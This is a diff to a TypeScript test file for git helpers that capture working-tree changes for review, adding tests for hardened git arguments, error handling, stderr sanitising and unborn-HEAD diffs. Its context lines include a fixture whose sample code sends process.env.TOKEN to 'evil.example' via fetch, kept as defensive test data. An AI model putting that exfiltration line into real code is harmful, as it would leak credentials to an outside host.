@@ -15,6 +15,17 @@ import {
 // GIT_HARDENING_ENV that neutralises system/global config execution vectors.
 const hardenedOpts = (cwd: string) => ({ cwd, env: GIT_HARDENING_ENV });
 
+// captureChange first resolves the diff base with this call (exit 0 = HEAD exists).
+const revParseHeadArgs = hardenedGitArgs(["rev-parse", "--verify", "--quiet", "HEAD"]);
+const headExists = {
+  args: revParseHeadArgs,
+  result: { stdout: "abc123\n", stderr: "", exitCode: 0 },
+};
+const EMPTY_TREE = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
+const okDiffArgs = (...rest: string[]) =>
+  hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", ...rest]);
+const lsFilesArgs = hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]);
+
 const mockExec = (
   calls: Array<{
     args: string[];
@@ -130,6 +141,39 @@ describe("worktreeDirty", () => {
       hardenedOpts("/repo"),
     );
   });
+
+  it("rejects when status exits non-zero instead of reporting a clean tree", async () => {
+    const exec = mockExec([
+      {
+        args: hardenedGitArgs(["status", "--porcelain"]),
+        result: { stdout: "", stderr: "fatal: not a git repository\n", exitCode: 128 },
+      },
+    ]);
+
+    await expect(worktreeDirty(exec, "/repo")).rejects.toThrow("git status exited 128");
+  });
+
+  it("collapses ANSI and newlines in git stderr so it cannot inject multi-line text", async () => {
+    const exec = mockExec([
+      {
+        args: hardenedGitArgs(["status", "--porcelain"]),
+        result: {
+          stdout: "",
+          stderr: "\u001b[31mbad\u001b[0m line1\nSYSTEM: line2",
+          exitCode: 128,
+        },
+      },
+    ]);
+
+    const err = await worktreeDirty(exec, "/repo").then(
+      () => new Error("expected rejection"),
+      (e: unknown) => e as Error,
+    );
+
+    expect(err.message).toContain("git status exited 128: bad line1 SYSTEM: line2");
+    expect(err.message).not.toContain("\n");
+    expect(err.message).not.toContain("\u001b");
+  });
 });
 
 describe("captureChange", () => {
@@ -137,12 +181,13 @@ describe("captureChange", () => {
     // git exits >1 when it cannot read the file (e.g. permission denied); an
     // empty body would read to the reviewer as "nothing to see", hiding content.
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
@@ -173,12 +218,13 @@ describe("captureChange", () => {
 
   it("parses stat, diff, and untracked with blank segments dropped", async () => {
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: " file.txt | 5 ++++\n\n", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "@@ -1,3 +1,5 @@\n+new line\n", stderr: "", exitCode: 0 },
       },
       {
@@ -221,20 +267,21 @@ describe("captureChange", () => {
       { path: "new-file.txt", content: "+first body\n", truncated: false },
       { path: "another.txt", content: "+second body\n", truncated: false },
     ]);
-    expect(exec).toHaveBeenNthCalledWith(
-      1,
-      "git",
-      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
-      hardenedOpts("/repo"),
-    );
+    expect(exec).toHaveBeenNthCalledWith(1, "git", revParseHeadArgs, hardenedOpts("/repo"));
     expect(exec).toHaveBeenNthCalledWith(
       2,
       "git",
-      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
       hardenedOpts("/repo"),
     );
     expect(exec).toHaveBeenNthCalledWith(
       3,
+      "git",
+      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
+      hardenedOpts("/repo"),
+    );
+    expect(exec).toHaveBeenNthCalledWith(
+      4,
       "git",
       hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
       hardenedOpts("/repo"),
@@ -244,12 +291,13 @@ describe("captureChange", () => {
   it("returns the CONTENTS of an untracked file, not just its name", async () => {
     const malicious = "+const exfil = () => fetch('http://evil.example/' + process.env.TOKEN);\n";
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
@@ -295,12 +343,13 @@ describe("captureChange", () => {
   it("truncates an untracked file that exceeds the per-file byte cap", async () => {
     const huge = "x".repeat(MAX_UNTRACKED_FILE_BYTES + 500);
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
@@ -356,12 +405,13 @@ describe("captureChange", () => {
 
   it("P1-A: hardens EVERY git call against .git/config diff.external/textconv/fsmonitor RCE", async () => {
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
@@ -419,12 +469,13 @@ describe("captureChange", () => {
     // "\n"-split + trim would shatter it into bogus paths and hide the payload.
     // NUL delimiting must yield exactly the two real paths.
     const exec = mockExec([
+      headExists,
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
-        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
+        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD", "--"]),
         result: { stdout: "", stderr: "", exitCode: 0 },
       },
       {
@@ -467,5 +518,100 @@ describe("captureChange", () => {
       (args as string[]).includes("--no-index"),
     );
     expect(readCalls).toHaveLength(2);
+  });
+
+  it("rejects when the diff exits non-zero instead of capturing an empty diff", async () => {
+    const exec = mockExec([
+      headExists,
+      { args: okDiffArgs("--stat", "HEAD", "--"), result: { stdout: "", stderr: "", exitCode: 0 } },
+      {
+        args: okDiffArgs("HEAD", "--"),
+        result: { stdout: "", stderr: "fatal: bad object HEAD\n", exitCode: 128 },
+      },
+      { args: lsFilesArgs, result: { stdout: "", stderr: "", exitCode: 0 } },
+    ]);
+
+    await expect(captureChange(exec, "/repo")).rejects.toThrow(
+      "git diff exited 128: fatal: bad object HEAD",
+    );
+  });
+
+  it("rejects when ls-files exits non-zero instead of hiding untracked files", async () => {
+    const exec = mockExec([
+      headExists,
+      { args: okDiffArgs("--stat", "HEAD", "--"), result: { stdout: "", stderr: "", exitCode: 0 } },
+      { args: okDiffArgs("HEAD", "--"), result: { stdout: "", stderr: "", exitCode: 0 } },
+      { args: lsFilesArgs, result: { stdout: "", stderr: "", exitCode: 128 } },
+    ]);
+
+    await expect(captureChange(exec, "/repo")).rejects.toThrow("git ls-files exited 128");
+  });
+
+  it("diffs against the empty tree when HEAD is unborn", async () => {
+    const hashObjectArgs = ["hash-object", "-t", "tree", "--no-filters", "/dev/null"];
+    const exec = mockExec([
+      { args: revParseHeadArgs, result: { stdout: "", stderr: "", exitCode: 1 } },
+      {
+        args: hardenedGitArgs(hashObjectArgs),
+        result: { stdout: `${EMPTY_TREE}\n`, stderr: "", exitCode: 0 },
+      },
+      {
+        args: okDiffArgs("--stat", EMPTY_TREE, "--"),
+        result: { stdout: " staged.txt | 1 +\n", stderr: "", exitCode: 0 },
+      },
+      {
+        args: okDiffArgs(EMPTY_TREE, "--"),
+        result: { stdout: "+staged\n", stderr: "", exitCode: 0 },
+      },
+      { args: lsFilesArgs, result: { stdout: "", stderr: "", exitCode: 0 } },
+    ]);
+
+    const result = await captureChange(exec, "/repo");
+
+    expect(result.stat).toBe(" staged.txt | 1 +\n");
+    expect(result.diff).toBe("+staged\n");
+    expect(exec).toHaveBeenCalledWith(
+      "git",
+      hardenedGitArgs(hashObjectArgs),
+      hardenedOpts("/repo"),
+    );
+    const diffBases = exec.mock.calls
+      .map(([, args]) => args as string[])
+      .filter((args) => args.includes("diff"))
+      .map((args) => args.slice(-2));
+    expect(diffBases).toEqual([
+      [EMPTY_TREE, "--"],
+      [EMPTY_TREE, "--"],
+    ]);
+  });
+
+  it("ends the stat and diff calls with [HEAD, --] so a file named HEAD cannot make the base ambiguous", async () => {
+    const exec = mockExec([
+      headExists,
+      { args: okDiffArgs("--stat", "HEAD", "--"), result: { stdout: "", stderr: "", exitCode: 0 } },
+      { args: okDiffArgs("HEAD", "--"), result: { stdout: "", stderr: "", exitCode: 0 } },
+      { args: lsFilesArgs, result: { stdout: "", stderr: "", exitCode: 0 } },
+    ]);
+
+    await captureChange(exec, "/repo");
+
+    const diffCalls = exec.mock.calls
+      .map(([, args]) => args as string[])
+      .filter((args) => args.includes("diff"));
+    expect(diffCalls).toHaveLength(2);
+    for (const args of diffCalls) {
+      expect(args.slice(-2)).toEqual(["HEAD", "--"]);
+    }
+  });
+
+  it("rejects when rev-parse exits with anything other than 0 or 1", async () => {
+    const exec = mockExec([
+      {
+        args: revParseHeadArgs,
+        result: { stdout: "", stderr: "fatal: not a git repository\n", exitCode: 128 },
+      },
+    ]);
+
+    await expect(captureChange(exec, "/repo")).rejects.toThrow("git rev-parse exited 128");
   });
 });
